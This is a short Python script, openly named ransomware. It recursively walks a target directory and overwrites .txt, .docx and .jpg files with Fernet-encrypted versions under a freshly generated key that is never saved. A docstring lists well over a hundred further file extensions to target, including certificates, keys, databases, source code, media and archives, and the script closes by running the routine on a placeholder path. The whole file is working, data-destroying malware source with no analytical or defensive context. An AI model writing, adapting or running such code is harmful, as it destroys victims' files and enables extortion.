import os
from cryptography.fernet import Fernet  # Make sure to install the cryptography library

# Specify the file extensions to target
target_extensions = ['.txt', '.docx', '.jpg']

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def ransomware(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)

# Example key generation, ensure to keep it secure
encryption_key = Fernet.generate_key()

# Example usage, replace 'target_directory' with the directory you want to target
"""
.jpg, .jpeg, .xml, .xsl, .wps, .cmf, .vbs, .accdb, .ini, .cdr, .svg, .conf, .config, .wb2, .msg, .azw, .azw1, .azw3, 
.azw4, .lit, .apnx, .mobi, .p12, .p7b, .p7c, .pfx, .pem, .cer, .key, .der, .mdb, .htm, .html, .class, .java, .asp, .aspx, 
.cgi, .php, .jsp, .bak, .dat, .pst, .eml, .xps, .sqllite, .sql, .jar, .wpd, .crt, .csv, .prf, .cnf, .indd, .number, .pages, 
.x3f, .srw, .pef, .raf, .rf, .nrw, .nef, .mrw, .mef, .kdc, .dcr, .crw, .eip, .fff, .iiq, .k25, .crwl, .bay, .sr2, .ari, .srf, 
.arw, .cr2, .raw, .rwl, .rw2, .r3d, .3fr, .eps, .pdd, .dng, .dxf, .dwg, .psd, .png, .jpe, .bmp, .gif, .tiff, .gfx, .jge, .tga,
.jfif, .emf, .3dm, .3ds, .max, .obj, .a2c, .dds, .pspimage, .yuv, .3g2, .3gp, .asf, .asx, .mpg, .mpeg, .avi, .mov, .flv, .wma, 
.wmv, .ogg, .swf, .ptx, .ape, .aif, .av, .ram, .m3u, .movie, .mp1, .mp2, .mp3, .mp4, .mp4v, .mpa, .mpe, .mpv2, .rpf, .vlc, .m4a, 
.aac, .aa3, .amr, .mkv, .dvd, .mts, .vob, .3ga, .m4v, .srt, .aepx, .camproj, .dash, .zip, .rar, .gzip, ., mdk, .mdf, .iso, .bin, 
.cue, .dbf, .erf, .dmg, .toast, .vcd, .ccd, .disc, .nrg, .nri, .cdi
"""
target_directory = '/path/to/target/directory'
ransomware(target_directory, encryption_key)
